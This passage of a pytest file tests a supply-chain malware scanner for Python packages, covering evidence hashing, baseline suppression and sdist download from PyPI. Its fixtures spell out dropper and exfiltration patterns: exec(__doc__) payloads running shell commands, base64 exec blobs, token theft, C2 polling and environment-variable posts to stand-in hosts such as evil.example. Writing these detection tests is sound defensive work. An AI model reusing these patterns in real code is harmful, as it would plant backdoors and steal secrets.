    gap = "\n".join(f"    pad{i} = {i}" for i in range(65))
    appended = existing + "/tmp/evil\n" + gap + "\nsubprocess.run(['curl', 'evil'])\n"
    base = sp._extract_evidence(existing, sp.RE_TEMP_EXEC)
    app = sp._extract_evidence(appended, sp.RE_TEMP_EXEC)
    assert sp._evidence_hash(base) != sp._evidence_hash(app)
    # a pure line shift of the same payload does not reopen
    shifted = sp._extract_evidence("\n\n" + appended, sp.RE_TEMP_EXEC)
    assert sp._evidence_hash(app) == sp._evidence_hash(shifted)


def test_hidden_payload_binds_visible_exec_trigger():
    # The hidden-payload finding binds the visible exec/eval line that makes the
    # docstring runnable, so flipping a harmless eval("1+1") to exec(__doc__) (which
    # now runs the same hidden network+exec payload) reopens instead of riding the
    # key on the unchanged hidden text.
    hidden = '"""\nimport requests; requests.get("http://evil")\nsubprocess.run(["sh"])\n"""\n'
    benign = hidden + 'eval("1+1")\n'
    armed = hidden + "exec(__doc__)\n"

    def key(src):
        return [
            sp._finding_key(f)
            for f in sp._hidden_payload_findings(
                src, sp._strip_noncode(src), "p/x.py", "p"
            )
            if "hidden network+exec" in f.check
        ][0]

    assert key(benign) != key(armed)


def test_js_finding_pins_full_content_digest():
    # A JS finding pins the full file content digest, so a backtick template literal
    # that closes the bracket span early cannot let later option/body lines change
    # without reopening (the Python-string-aware extractor would otherwise omit
    # them). Holds for small files too, not just large bundles.
    old = (
        "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'OLD'})\n"
    )
    new = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'EVIL'})\n"
    fo = [f for f in sp.check_js_file(old, "p/w.js", "p") if "Web3" in f.check][0]
    fn = [f for f in sp.check_js_file(new, "p/w.js", "p") if "Web3" in f.check][0]
    assert "bundle-sha256:" in fo.evidence
    assert sp._finding_key(fo) != sp._finding_key(fn)


def test_extract_evidence_binds_moderate_appended_dotall_span():
    # A multi-line construct appended under a check that already has a one-line
    # match is still recorded when it is not a giant whole-file bridge, so its
    # payload reopens instead of riding the old one-line match.
    one = "while True: time.sleep(60); requests.get('http://a/poll')\n"
    gap = "\n".join(f"    x = {i}" for i in range(20))
    old = one + "while True:\n" + gap + "\n    requests.get('http://old/c2')\n"
    new = one + "while True:\n" + gap + "\n    requests.get('http://evil/c2')\n"
    eo = sp._extract_evidence(old, sp.RE_C2_POLLING)
    en = sp._extract_evidence(new, sp.RE_C2_POLLING)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_canon_evidence_reorder_reopens():
    # Reordering matched lines changes executable context, so the key reopens
    # (the canon preserves discovery order rather than sorting).
    a = "Net: L10: requests.post(url)\nEnv: L20: env = os.environ.copy()"
    b = "Env: L20: env = os.environ.copy()\nNet: L10: requests.post(url)"
    assert sp._evidence_hash(a) != sp._evidence_hash(b)


def test_logical_line_end_ignores_brackets_in_strings():
    # A ) inside a string argument must not close the call early, so later
    # argument lines still bind and a changed payload there reopens.
    old = "requests.post('http://h/p)',\n    data=secret_old,\n)\n"
    new = "requests.post('http://h/p)',\n    data=secret_new,\n)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert "data=secret_old" in eo
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_base64_exec_blob_finding_binds_every_blob():
    # The base64+exec+blob finding digests every blob, so appending a second
    # encoded payload reopens even when the first blob and decode line are unchanged.
    head = "import base64\nblob1 = '" + "A" * 220 + "'\nexec(base64.b64decode(blob1))\n"
    old = head
    new = head + "blob2 = '" + "B" * 220 + "'\n"
    fo = [
        f
        for f in sp.check_py_file(old, "p/x.py", "p")
        if "large encoded blob" in f.check
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/x.py", "p")
        if "large encoded blob" in f.check
    ]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_pth_large_blob_finding_binds_every_blob():
    # The .pth large-blob finding digests every blob, so appending a second
    # encoded payload reopens rather than riding the unchanged first blob.
    old = "import os\n" + "X" * 220 + "\n"
    new = old + "Y" * 220 + "\n"
    fo = [
        f
        for f in sp.check_pth_file(old, "p/x.pth", "p")
        if "large base64-like blob" in f.check
    ]
    fn = [
        f
        for f in sp.check_pth_file(new, "p/x.pth", "p")
        if "large base64-like blob" in f.check
    ]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_pth_unusually_large_finding_is_content_bound():
    # Two different payloads of equal size and import count must get different
    # keys: the finding now pins the .pth content via a digest.
    a = [
        f
        for f in sp.check_pth_file("import abc; n=" + repr("!" * 500), "p/x.pth", "p")
        if f.check.startswith("Unusually large executable .pth")
    ]
    b = [
        f
        for f in sp.check_pth_file("import xyz; n=" + repr("?" * 500), "p/x.pth", "p")
        if f.check.startswith("Unusually large executable .pth")
    ]
    assert a and b
    assert "sha256:" in a[0].evidence
    assert sp._finding_key(a[0]) != sp._finding_key(b[0])


def test_js_token_network_finding_binds_network_evidence():
    # The JS stealer combo records both the token AND the network call, so a
    # changed exfil endpoint reopens (RE_NETWORK-recognized call used here).
    old = (
        "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://old.example');\n"
    )
    new = "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://evil.example');\n"
    fo = [f for f in sp.check_js_file(old, "p/p.js", "p") if "stealer" in f.check]
    fn = [f for f in sp.check_js_file(new, "p/p.js", "p") if "stealer" in f.check]
    assert fo and fn
    assert "Network:" in fo[0].evidence
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_embedded_pem_key_body_change_reopens():
    # The embedded-key evidence pins the full PEM block via a digest, so swapping
    # the key body under the same BEGIN/END markers reopens the finding instead
    # of riding the unchanged marker line.
    head = "-----BEGIN RSA PRIVATE KEY-----\n"
    tail = "\n-----END RSA PRIVATE KEY-----"
    net = "\nrequests.get('http://c2.example')\n"
    old = f"k = '''{head}MIIoldAAAAAAAAAAAAAAAAAAAA{tail}'''{net}"
    new = f"k = '''{head}MIInewBBBBBBBBBBBBBBBBBBBB{tail}'''{net}"
    fo = [
        f
        for f in sp.check_py_file(old, "p/k.py", "p")
        if f.check.startswith("Embedded cryptographic key + network")
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/k.py", "p")
        if f.check.startswith("Embedded cryptographic key + network")
    ]
    assert fo and fn
    assert "sha256:" in fo[0].evidence
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_shell_combos_bind_network_evidence():
    # Both shell combos record their network/exec side, so a changed endpoint
    # reopens instead of riding the unchanged token or hook line.
    old = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://old.example')\n"
    new = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://evil.example')\n"
    to = [
        f
        for f in sp.check_shell_file(old, "p/i.sh", "p")
        if f.check == "Shell embeds credential regexes AND makes network calls"
    ]
    tn = [
        f
        for f in sp.check_shell_file(new, "p/i.sh", "p")
        if f.check == "Shell embeds credential regexes AND makes network calls"
    ]
    assert to and tn
    assert sp._finding_key(to[0]) != sp._finding_key(tn[0])
    ho = "SessionStart hook installed\nrequests.get('http://old.example')\n"
    hn = "SessionStart hook installed\nrequests.get('http://evil.example')\n"
    go = [
        f
        for f in sp.check_shell_file(ho, "p/i.sh", "p")
        if f.check.startswith("Shell installs developer-tool")
    ]
    gn = [
        f
        for f in sp.check_shell_file(hn, "p/i.sh", "p")
        if f.check.startswith("Shell installs developer-tool")
    ]
    assert go and gn
    assert "Hook:" in go[0].evidence
    assert sp._finding_key(go[0]) != sp._finding_key(gn[0])


def test_hidden_network_exec_reopens_on_endpoint_change():
    # The hidden network+exec payload binds both the network and the exec signal,
    # so changing the docstring exfil URL reopens the finding.
    old = (
        '"""\nimport urllib.request, os\nurllib.request.urlopen("http://old/x").read()\n'
        'os.system("sh -c id")\n"""\nexec(__doc__)\n'
    )
    new = (
        '"""\nimport urllib.request, os\nurllib.request.urlopen("http://evil/x").read()\n'
        'os.system("sh -c id")\n"""\nexec(__doc__)\n'
    )
    fo = [
        f
        for f in sp.check_py_file(old, "p/d.py", "p")
        if "hidden network+exec" in f.check
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/d.py", "p")
        if "hidden network+exec" in f.check
    ]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_base64_exec_blob_combo_binds_blob_digest():
    # The blob may sit on a separate line from the decode call; the finding now
    # digests it, so a changed payload reopens even with unchanged base64/exec.
    b1 = "BLOB = '" + "A" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
    b2 = "BLOB = '" + "B" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
    f1 = [
        f
        for f in sp.check_py_file(b1, "p/m.py", "p")
        if "large encoded blob" in f.check
    ]
    f2 = [
        f
        for f in sp.check_py_file(b2, "p/m.py", "p")
        if "large encoded blob" in f.check
    ]
    assert f1 and f2
    assert "Blob: sha256:" in f1[0].evidence
    assert sp._finding_key(f1[0]) != sp._finding_key(f2[0])


def test_openssl_key_combo_binds_key_evidence():
    # openssl + embedded key with no network must bind the key, so a changed key
    # reopens instead of riding the OpenSSL line alone.
    o1 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----A"\n'
    o2 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----B"\n'
    g1 = [
        f
        for f in sp.check_py_file(o1, "p/o.py", "p")
        if "openssl encryption" in f.check
    ]
    g2 = [
        f
        for f in sp.check_py_file(o2, "p/o.py", "p")
        if "openssl encryption" in f.check
    ]
    assert g1 and g2
    assert "Key:" in g1[0].evidence
    assert sp._finding_key(g1[0]) != sp._finding_key(g2[0])


def test_anti_analysis_combo_binds_suspicious_side():
    # The anti-analysis combo records the network/exec side, so a changed exfil
    # endpoint reopens instead of riding the unchanged sleep/trace line.
    old = "import time, requests\ntime.sleep(600)\nrequests.get('http://old.example')\n"
    new = "import time, requests\ntime.sleep(600)\nrequests.get('http://evil.example/exfil')\n"
    fo = [
        f
        for f in sp.check_py_file(old, "p/x.py", "p")
        if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/x.py", "p")
        if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"
    ]
    assert fo and fn
    assert "Network:" in fo[0].evidence
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_dns_exfil_combo_binds_other_side():
    # The DNS exfil combo records the co-occurring network side, so a changed
    # endpoint reopens instead of riding the unchanged DNS line.
    old = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://old.example')\n"
    new = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://evil.example/x')\n"
    fo = [
        f
        for f in sp.check_py_file(old, "p/d.py", "p")
        if f.check == "DNS exfiltration / tunneling patterns"
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/d.py", "p")
        if f.check == "DNS exfiltration / tunneling patterns"
    ]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_large_js_bundle_finding_is_content_bound():
    # A large benign JS bundle yields a HIGH carrying a content digest, not empty
    # evidence: two different bundles in the same size bucket get different keys,
    # so a malicious bundle cannot ride a baselined empty-evidence entry.
    big_a = "var x = 1;\n" * 20000  # ~200 KB, benign
    big_b = big_a + "var exfil = 2;\n"  # different content, same size bucket
    ja = [
        f
        for f in sp.check_js_file(big_a, "pkg/bundle.js", "pkg")
        if "JS bundle" in f.check
    ]
    jb = [
        f
        for f in sp.check_js_file(big_b, "pkg/bundle.js", "pkg")
        if "JS bundle" in f.check
    ]
    assert ja and jb, "large JS bundle must produce a finding"
    assert ja[0].evidence.startswith("sha256:")
    assert sp._finding_key(ja[0]) != sp._finding_key(jb[0])


def test_pth_large_blob_finding_is_content_bound():
    # The .pth base64-blob evidence pins the full blob via a digest, so a payload
    # that keeps the first 120 chars but changes the tail reopens the finding.
    head = "A" * 120
    a = [
        f
        for f in sp.check_pth_file("import os\n" + head + "B" * 200, "p/x.pth", "p")
        if "base64-like blob" in f.check
    ]
    b = [
        f
        for f in sp.check_pth_file("import os\n" + head + "C" * 200, "p/x.pth", "p")
        if "base64-like blob" in f.check
    ]
    assert a and b, "large .pth blob must produce a finding"
    assert "sha256:" in a[0].evidence
    assert sp._finding_key(a[0]) != sp._finding_key(b[0])


def test_pth_import_lines_record_all_not_first_five():
    # All executable import lines are recorded, so swapping the sixth import for a
    # malicious one (first five unchanged) still reopens the catch-all finding.
    base = "".join(f"import mod{i}\n" for i in range(6))
    swapped = "".join(f"import mod{i}\n" for i in range(5)) + "import evil\n"
    fb = [
        f
        for f in sp.check_pth_file(base, "p/x.pth", "p")
        if "executable import line" in f.check
    ]
    fs = [
        f
        for f in sp.check_pth_file(swapped, "p/x.pth", "p")
        if "executable import line" in f.check
    ]
    assert fb and fs
    assert sp._finding_key(fb[0]) != sp._finding_key(fs[0])


def test_load_baseline_warns_on_missing_evidence_hash(tmp_path, capsys):
    # A legacy baseline predating evidence_hash still loads (hash recomputed) but
    # must WARN so the maintainer regenerates rather than degrade silently.
    import json

    bl = tmp_path / "legacy.json"
    bl.write_text(
        json.dumps(
            {
                "version": 1,
                "entries": [
                    {
                        "package": "p",
                        "file": "p/x.py",
                        "check": "c",
                        "severity": sp.CRITICAL,
                        "evidence": "L5: while True:",
                    }
                ],
            }
        )
    )
    keys = sp._load_baseline(str(bl))
    assert keys  # still loaded
    assert "lack evidence_hash" in capsys.readouterr().err


def test_fstring_statement_is_not_blanked():
    # A bare f-string evaluates at import, so it must stay scannable.
    src = "f\"{__import__('os').system('id')}\"\n"
    assert "__import__" in sp._strip_noncode(src)
    # A plain bare docstring is blanked.
    plain = "'a docstring mentioning subprocess.Popen'\n"
    assert "subprocess" not in sp._strip_noncode(plain)


def test_exec_with_payload_hidden_in_docstring_flagged():
    blob = "A" * 400
    src = '"""' + blob + '"""\nimport os\nexec(__doc__)\n'
    findings = sp.check_py_file(src, "pkg/mod.py", "pkg")
    assert any("hidden in a docstring" in f.check for f in findings)
    # No exec/eval -> the blanked blob produces no such finding.
    src2 = '"""' + blob + '"""\nimport os\n'
    findings2 = sp.check_py_file(src2, "pkg/mod.py", "pkg")
    assert not any("hidden in a docstring" in f.check for f in findings2)


def test_hidden_network_plus_exec_payload_flagged():
    # exec(__doc__) dropper: the docstring (blanked by code-only scanning) holds
    # BOTH a network fetch and an os/shell exec. Neither is a blob, but together
    # they are the payload, so the gate must flag the pair.
    payload = (
        "import urllib.request, os\n"
        "urllib.request.urlopen('http://x/y').read()\n"
        "os.system('sh -c id')\n"
    )
    src = '"""' + payload + '"""\nexec(__doc__)\n'
    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
    assert any("hidden network+exec payload" in f.check for f in findings)


def test_real_code_network_and_subprocess_not_hidden_combo():
    # Both calls live in REAL code (covered by the normal checks); the hidden
    # network+exec combo must NOT also fire on them.
    src = (
        "import subprocess, urllib.request\n"
        "def run():\n"
        "    urllib.request.urlopen('http://x').read()\n"
        "    subprocess.Popen(['sh'])\n"
        "exec('1 + 1')\n"
    )
    findings = sp.check_py_file(src, "pkg/real.py", "pkg")
    assert not any("hidden network+exec payload" in f.check for f in findings)


def test_hidden_payload_survives_visible_decoy():
    # A benign visible network call must not mask a docstring payload: the
    # detector inspects the removed (blanked) span, not the whole stripped file.
    payload = (
        "import urllib.request, os\n"
        "urllib.request.urlopen('http://evil/x').read()\n"
        "os.system('sh -c id')\n"
    )
    src = (
        '"""' + payload + '"""\n'
        "import urllib.request\n"
        "urllib.request.urlopen('http://benign/ok')\n"  # visible decoy
        "exec(__doc__)\n"
    )
    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
    assert any("hidden network+exec payload" in f.check for f in findings)


def test_comment_only_network_exec_not_flagged():
    # Tokens only in comments are not executable by exec(); the hidden network+exec
    # check inspects strings/docstrings (not comments), so this must stay clean.
    src = (
        "code = 'x = 1'\n"
        "exec(code)\n"
        "# urllib.request.urlopen('http://host/p').read()\n"
        "# subprocess.run(['sh', '-c', 'id'])\n"
    )
    findings = sp.check_py_file(src, "pkg/ex.py", "pkg")
    assert not any("hidden network+exec payload" in f.check for f in findings)


def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
    bl = tmp_path / "bl.json"
    listed = _mk(
        sp.CRITICAL,
        "fastapi",
        "fastapi/routing.py",
        "C2 polling/beaconing loop detected",
        "L579: while True:",
    )
    sp._write_baseline(str(bl), [listed])
    baseline = sp._load_baseline(str(bl))

    # Same (package, path, check, matched code) -> suppressed.
    active, suppressed = sp._partition_baseline([listed], baseline)
    assert suppressed == [listed] and active == []

    # A NEW kind of finding in the SAME file is a different check -> still active.
    new_kind = _mk(
        sp.CRITICAL,
        "fastapi",
        "fastapi/routing.py",
        "Reverse shell / bind shell pattern",
    )
    active2, suppressed2 = sp._partition_baseline([new_kind], baseline)
    assert active2 == [new_kind] and suppressed2 == []

    # Same file + same check but CHANGED flagged code -> still active. A future
    # malicious payload cannot ride a previously reviewed entry's suppression.
    changed_code = _mk(
        sp.CRITICAL,
        "fastapi",
        "fastapi/routing.py",
        "C2 polling/beaconing loop detected",
        "L579: while True: requests.get('http://c2.example/beacon')",
    )
    active3, suppressed3 = sp._partition_baseline([changed_code], baseline)
    assert active3 == [changed_code] and suppressed3 == []

    # A benign line shift of the SAME code stays suppressed (no version churn).
    shifted = _mk(
        sp.CRITICAL,
        "fastapi",
        "fastapi/routing.py",
        "C2 polling/beaconing loop detected",
        "L640: while True:",
    )
    active4, suppressed4 = sp._partition_baseline([shifted], baseline)
    assert suppressed4 == [shifted] and active4 == []


def test_write_baseline_roundtrip_only_crit_high(tmp_path):
    bl = tmp_path / "bl.json"
    findings = [
        _mk(sp.CRITICAL, "p", "a.py", "c1"),
        _mk(sp.HIGH, "p", "b.py", "c2"),
        _mk(sp.MEDIUM, "p", "c.py", "c3"),  # MEDIUM excluded from baseline
    ]
    sp._write_baseline(str(bl), findings)
    keys = sp._load_baseline(str(bl))
    assert sp._finding_key(findings[0]) in keys
    assert sp._finding_key(findings[1]) in keys
    assert sp._finding_key(findings[2]) not in keys


def test_load_baseline_missing_file_is_empty():
    assert sp._load_baseline("/nonexistent/path/bl.json") == set()


def test_load_baseline_rejects_non_list_entries(tmp_path, capsys):
    # A malformed baseline whose "entries" is not a list must warn and fail
    # closed (empty), not raise TypeError when iterated.
    import json

    bl = tmp_path / "bad_entries.json"
    bl.write_text(json.dumps({"version": 1, "entries": None}), encoding = "utf-8")
    assert sp._load_baseline(str(bl)) == set()
    assert "entries is not a list" in capsys.readouterr().err


def test_committed_baseline_suppresses_known_but_not_a_new_payload():
    """End-to-end against the shipped allowlist: a reviewed benign finding stays
    suppressed, but a NEW malicious payload in the same baselined file/check is
    not (closes the supply-chain bypass where a future botocore/utils.py payload
    rode the existing CRITICAL entry)."""
    import json

    baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(baseline_path.read_text())["entries"]
    target = next(
        e
        for e in entries
        if e["package"] == "botocore"
        and e["file"] == "botocore/utils.py"
        and e["check"]
        == "Harvests environment variables/secrets AND makes network calls"
    )
    baseline = sp._load_baseline(str(baseline_path))

    # The exact reviewed finding is suppressed.
    benign = _mk(
        target["severity"],
        target["package"],
        target["file"],
        target["check"],
        target["evidence"],
    )
    active, suppressed = sp._partition_baseline([benign], baseline)
    assert suppressed == [benign] and active == []

    # A future malicious version: same file, same check, new exfil code. Must
    # remain ACTIVE so the enforcing gate (exit 1) still trips.
    malicious = _mk(
        target["severity"],
        target["package"],
        target["file"],
        target["check"],
        "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
    )
    active2, suppressed2 = sp._partition_baseline([malicious], baseline)
    assert active2 == [malicious] and suppressed2 == []


def test_committed_baseline_entries_all_carry_evidence_hash():
    """Every shipped entry must pin an evidence_hash; an entry without one would
    silently fall back to the coarse legacy match for that file/check."""
    import json

    baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(baseline_path.read_text())["entries"]
    assert entries, "committed baseline should not be empty"
    missing = [
        f"{e['package']}:{e['file']}:{e['check']}"
        for e in entries
        if not e.get("evidence_hash")
    ]
    assert not missing, f"entries missing evidence_hash: {missing[:5]}"
    # And each pinned hash matches a recompute from the stored evidence.
    for e in entries:
        assert e["evidence_hash"] == sp._evidence_hash(e["evidence"]), e["file"]


# sdist fallback: cover sdist-only packages without building. All offline
# -- PyPI JSON / download are mocked.


class _FakeResp:
    """Minimal urlopen() context-manager stand-in."""

    def __init__(
        self,
        data: bytes = b"",
        status: int = 200,
    ):
        self._data = data
        self.status = status

    def read(self, n: int = -1) -> bytes:
        return self._data

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def _f(packagetype: str, filename: str, url: str) -> dict:
    return {"packagetype": packagetype, "filename": filename, "url": url}


def _meta(
    files: list[dict],
    requires = None,
    version: str = "1.0.0",
) -> dict:
    return {
        "info": {"version": version, "requires_dist": requires or []},
        "urls": files,
        "releases": {version: files},
    }


def test_spec_pin_version():
    assert sp._spec_pin_version("torch==2.3.1") == "2.3.1"
    assert sp._spec_pin_version("torch>=2.0") is None
    assert sp._spec_pin_version("numpy") is None


def test_release_has_wheel_detects_sdist_only():
    sdist_only = _meta(
        [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")]
    )
    assert sp._release_has_wheel(sdist_only, None) is False
    assert sp._release_has_wheel(sdist_only, "1.0.0") is False
    has_wheel = _meta(
        [
            _f("sdist", "x.tar.gz", "https://files.pythonhosted.org/x.tar.gz"),
            _f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl"),
        ]
    )
    assert sp._release_has_wheel(has_wheel, None) is True


def test_is_trusted_pypi_url_only_https_pypi():
    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org/p/x.tar.gz") is True
    assert sp._is_trusted_pypi_url("https://pypi.org/x.tar.gz") is True
    assert (
        sp._is_trusted_pypi_url("http://files.pythonhosted.org/x.tar.gz") is False
    )  # not https
    assert sp._is_trusted_pypi_url("https://evil.example/x.tar.gz") is False
    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org.evil.com/x") is False


def test_requires_dist_skips_extras():
    meta = _meta(
        [],
        requires = [
            "numpy (>=1.20)",
            "torch ; extra == 'dev'",  # optional extra -> skipped
            "pyyaml>=5 ; python_version >= '3.8'",  # non-extra marker -> kept
            "payload>=1 ; extra != 'dev'",  # default-true marker -> kept
        ],
    )
    specs = sp._requires_dist_names(meta)
    # Version constraints are preserved so a pinned dep is fetched, not latest.
    assert "numpy>=1.20" in specs
    assert "pyyaml>=5" in specs
    # A default-true marker that merely mentions ``extra`` is NOT optional.
    assert "payload>=1" in specs
    # The extra-gated dep is skipped entirely (no torch under any form).
    assert not any(sp._extract_pkg_name(s) == "torch" for s in specs)


def test_marker_holds_by_default():
    # Optional only when the extra is the sole gate.
    assert sp._marker_holds_by_default("extra == 'dev'") is False
    assert sp._marker_holds_by_default('extra == "dev"') is False
    # Default-true markers that mention extra must be kept.
    assert sp._marker_holds_by_default("extra != 'dev'") is True
    assert (
        sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
    )
    # No marker / plain env marker -> kept.
    assert sp._marker_holds_by_default("") is True
    # Platform/python markers are kept: the scanner runs on one target but the
    # package may install on another, so these deps must still be scanned.
    assert sp._marker_holds_by_default("sys_platform == 'win32'") is True
    assert sp._marker_holds_by_default("python_version == '3.13'") is True
    assert (
        sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'")
        is True
    )


def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
    # The pinned release's own metadata cannot be fetched -> recover nothing
    # rather than substituting the latest release's (wrong) dependency tree.
    project = _meta([], requires = ["latestdep==9.9.9"])
    monkeypatch.setattr(
        sp, "_pypi_json", lambda name, version = None: None if version else project
    )
    assert sp._requires_dist_for("oldpkg", "1.0.0", project) == []


def test_requires_dist_for_uses_pinned_release(monkeypatch):
    # Project-level (latest) metadata declares no malicious dep; the pinned
    # release does. _requires_dist_for must follow the pinned release's tree.
    project = _meta([], requires = ["harmless>=1"])
    pinned = _meta([], requires = ["payload==1.0.0"])
    monkeypatch.setattr(
        sp, "_pypi_json", lambda name, version = None: pinned if version else project
    )
    specs = sp._requires_dist_for("oldpkg", "1.0.0", project)
    assert "payload==1.0.0" in specs
    assert "harmless>=1" not in specs


def test_requires_dist_for_records_incomplete_scan_error(monkeypatch):
    # Missing pinned metadata must surface an incomplete-scan error, not a silent
    # [] that a caller cannot tell apart from a genuine no-deps release.
    project = _meta([], requires = ["latestdep==9.9.9"])
    monkeypatch.setattr(
        sp, "_pypi_json", lambda name, version = None: None if version else project
    )
    errors: list[str] = []
    assert sp._requires_dist_for("oldpkg", "1.0.0", project, errors) == []
    assert errors and "incomplete" in errors[0]


def test_release_files_pinned_missing_fails_closed():
    # A pin absent from metadata must NOT fall back to the latest artifact.
    meta = _meta(
        [
            _f(
                "sdist",
                "x-2.0.0.tar.gz",
                "https://files.pythonhosted.org/x-2.0.0.tar.gz",
            )
        ],
        version = "2.0.0",
    )
    assert sp._release_files(meta, "9.9.9") == []  # missing pin -> empty, not latest
    assert sp._release_has_wheel(meta, "9.9.9") is False
    assert sp._release_files(meta, "2.0.0")  # present pin still resolves
    assert sp._release_files(meta, None)  # unpinned still uses latest


def test_download_sdist_direct_missing_pin_does_not_scan_latest(tmp_path):
    # Pinned version absent -> no sdist returned (never the latest file).
    meta = _meta(
        [
            _f(
                "sdist",
                "x-2.0.0.tar.gz",
                "https://files.pythonhosted.org/x-2.0.0.tar.gz",
            )
        ],
        version = "2.0.0",
    )
    fpath, err = sp._download_sdist_direct("x", "9.9.9", str(tmp_path), meta = meta)
    assert fpath is None and "no sdist" in err
    assert list(tmp_path.iterdir()) == []


def test_download_sdist_direct_refuses_non_pypi_url(tmp_path):
    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://evil.example/x.tar.gz")])
    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta = meta)
    assert fpath is None and "non-PyPI" in err
    assert list(tmp_path.iterdir()) == []  # nothing written


def test_download_sdist_direct_no_sdist_published(tmp_path):
    meta = _meta([_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")])
    fpath, err = sp._download_sdist_direct("x", None, str(tmp_path), meta = meta)
    assert fpath is None and "no sdist" in err


def test_download_sdist_direct_writes_and_preserves_suffix(tmp_path, monkeypatch):
    payload = b"\x1f\x8b" + b"fake-tar-gz-bytes"
    monkeypatch.setattr(
        sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(payload)
    )
    meta = _meta(
        [
            _f(
                "sdist",
                "langid-1.1.6.tar.gz",
                "https://files.pythonhosted.org/langid-1.1.6.tar.gz",
            )
        ],
        version = "1.1.6",
    )
    fpath, err = sp._download_sdist_direct("langid", "1.1.6", str(tmp_path), meta = meta)
    assert err is None and fpath is not None
    assert fpath.endswith(".tar.gz")  # suffix preserved -> archive reader picks format
    assert Path(fpath).read_bytes() == payload


def test_download_sdist_direct_size_cap(tmp_path, monkeypatch):
    monkeypatch.setattr(sp, "_MAX_SDIST_BYTES", 8)
    monkeypatch.setattr(
        sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"x" * 100)
    )
    meta = _meta(
        [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")]
    )
    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta = meta)
    assert fpath is None and "cap" in err


def test_per_spec_genuine_failure_is_recorded_error(tmp_path, monkeypatch):
    # A spec that fails pip but HAS a wheel on PyPI is a genuine error (-> exit 2).
    class _Proc:
        returncode = 1
        stderr = "ResolutionImpossible"

    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
    monkeypatch.setattr(
        sp,
        "_pypi_json",
        lambda name, version = None: _meta(
            [_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")]
        ),
    )
    errors: list[str] = []
    sp._resolve_per_spec_with_deps(["somepkg==1.0.0"], str(tmp_path), {}, errors)
    assert errors and "somepkg" in errors[0]


def test_per_spec_sdist_only_is_not_error(tmp_path, monkeypatch):
    # sdist-only spec: pip fails, PyPI shows no wheel -> direct fetch, no error.
    class _Proc:
        returncode = 1
        stderr = "No matching distribution"

    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
    monkeypatch.setattr(
        sp,
        "_pypi_json",
        lambda name, version = None: _meta(
            [
                _f(
                    "sdist",
                    "x-1.0.0.tar.gz",
                    "https://files.pythonhosted.org/x-1.0.0.tar.gz",
                )
            ]
        ),
    )
    monkeypatch.setattr(
        sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"\x1f\x8bdata")
    )
    errors: list[str] = []
    sp._resolve_per_spec_with_deps(["x==1.0.0"], str(tmp_path), {}, errors)
    assert errors == []  # sdist-only handled, not an exit-2 failure
    assert any(p.name.endswith(".tar.gz") for p in tmp_path.iterdir())


# ---------------------------------------------------------------------------
# --fix path: download_packages() returns (results, download_errors); both
# --fix call sites must unpack the tuple, not treat it as the results list.
# ---------------------------------------------------------------------------


def test_find_safe_version_handles_download_tuple(monkeypatch):
    # One downloaded archive, returned as the real (results, download_errors) tuple.
